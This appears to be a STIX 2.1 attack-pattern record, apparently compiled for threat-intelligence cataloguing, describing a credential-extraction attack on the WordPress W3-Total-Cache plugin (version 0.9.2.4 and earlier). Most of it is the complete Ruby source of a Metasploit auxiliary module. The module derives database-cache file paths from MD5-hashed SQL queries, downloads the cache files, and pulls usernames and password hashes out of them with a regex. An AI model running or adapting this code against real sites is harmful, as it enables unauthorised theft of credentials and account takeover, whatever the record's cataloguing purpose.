{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--553e7e4d-2c67-45eb-b3b0-90104e621428",
    "created": "2024-08-14T16:32:36.39143Z",
    "modified": "2024-08-14T16:32:36.391434Z",
    "name": "WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract",
    "description": " \"The W3-Total-Cache Wordpress Plugin <= 0.9.2.4 can cache database statements and its results in files for fast access. Version 0.9.2.4 has been fixed afterwards so it can be vulnerable. These cache files are in the webroot of the Wordpress installation and can be downloaded if the name is guessed. This module tries to locate them with brute force in order to find usernames and password hashes in these files. W3 Total Cache must be configured with Database Cache enabled and Database Cache Method set to Disk to be vulnerable\" 'License'       => MSF_LICENSE 'References'    => [ ['OSVDB', '88744']",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/wp_w3_total_cache_hash_extract.rb",
            "external_id": "wp_w3_total_cache_hash_extract.rb"
        },
        {
            "source_name": "WPVDB",
            "external_id": "6621"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'          => 'WordPress W3-Total-Cache Plugin 0.9.2.4 (or before) Username and Hash Extract',\n      'Description'   =>\n        \"The W3-Total-Cache Wordpress Plugin <= 0.9.2.4 can cache database statements\n        and its results in files for fast access. Version 0.9.2.4 has been fixed afterwards\n        so it can be vulnerable. These cache files are in the webroot of the Wordpress\n        installation and can be downloaded if the name is guessed. This module tries to\n        locate them with brute force in order to find usernames and password hashes in these\n        files. W3 Total Cache must be configured with Database Cache enabled and Database\n        Cache Method set to Disk to be vulnerable\",\n      'License'       => MSF_LICENSE,\n      'References'    =>\n        [\n          ['OSVDB', '88744'],\n          ['URL', 'https://seclists.org/fulldisclosure/2012/Dec/242'],\n          ['WPVDB', '6621']\n        ],\n      'Author'        =>\n        [\n          'Christian Mehlmauer',                    # Metasploit module\n          'Jason A. Donenfeld <Jason[at]zx2c4.com>' # POC\n        ]\n    )\n\n    register_options(\n      [\n        OptString.new('TABLE_PREFIX', [true,\t'Wordpress table prefix', 'wp_']),\n        OptInt.new('SITE_ITERATIONS', [true, 'Number of sites to iterate', 25]),\n        OptInt.new('USER_ITERATIONS', [true, 'Number of users to iterate', 25])\n      ])\n  end\n\n  def table_prefix\n    datastore['TABLE_PREFIX']\n  end\n\n  def site_iterations\n    datastore['SITE_ITERATIONS']\n  end\n\n  def user_iterations\n    datastore['USER_ITERATIONS']\n  end\n\n  # Call the User site, so the db statement will be cached\n  def cache_user_info(user_id)\n    user_url = normalize_uri(target_uri)\n    begin\n      send_request_cgi(\n        'uri'      => user_url,\n        'method'   => 'GET',\n        'vars_get' => {\n          'author' => user_id.to_s\n        }\n      )\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Unable to connect to #{user_url}\")\n    rescue ::Timeout::Error, ::Errno::EPIPE\n      vprint_error(\"Unable to connect to #{user_url}\")\n    end\n\n    nil\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :nonreplayable_hash,\n      jtr_format: 'md5,des'\n    }.merge(service_data)\n\n    login_data = {\n      last_attempted_at: Time.now,\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::SUCCESSFUL,\n      proof: opts[:proof]\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def run_host(ip)\n    users_found = false\n\n    (1..site_iterations).each do |site_id|\n\n      vprint_status(\"Trying site_id #{site_id}...\")\n\n      (1..user_iterations).each do |user_id|\n\n        vprint_status(\"Trying user_id #{user_id}...\")\n\n        # used to cache the statement\n        cache_user_info(user_id)\n        query = \"SELECT * FROM #{table_prefix}users WHERE ID = '#{user_id}'\"\n        query_md5 = ::Rex::Text.md5(query)\n        host = datastore['VHOST'] || ip\n        key = \"w3tc_#{host}_#{site_id}_sql_#{query_md5}\"\n        key_md5 = ::Rex::Text.md5(key)\n        hash_path = normalize_uri(key_md5[0, 1], key_md5[1, 1], key_md5[2, 1], key_md5)\n        url = normalize_uri(wordpress_url_wp_content, 'w3tc', 'dbcache', hash_path)\n\n        result = nil\n        begin\n          result = send_request_cgi('uri' => url, 'method' => 'GET')\n        rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n          print_error(\"Unable to connect to #{url}\")\n          break\n        rescue ::Timeout::Error, ::Errno::EPIPE\n          print_error(\"Unable to connect to #{url}\")\n          break\n        end\n\n        if result.nil? || result.body.nil?\n          print_error('No response received')\n          break\n        end\n\n        match = result.body.scan(/.*\"user_login\";s:[0-9]+:\"([^\"]*)\";s:[0-9]+:\"user_pass\";s:[0-9]+:\"([^\"]*)\".*/)[0]\n        unless match.nil?\n          print_good(\"Username: #{match[0]}\")\n          print_good(\"Password Hash: #{match[1]}\")\n          report_cred(\n            ip: rhost,\n            port: rport,\n            service_name: ssl ? 'https' : 'http',\n            user: match[0],\n            password: match[1],\n            proof: result.body\n          )\n          users_found = true\n        end\n      end\n    end\n    print_error('No users found :(') unless users_found\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ]
}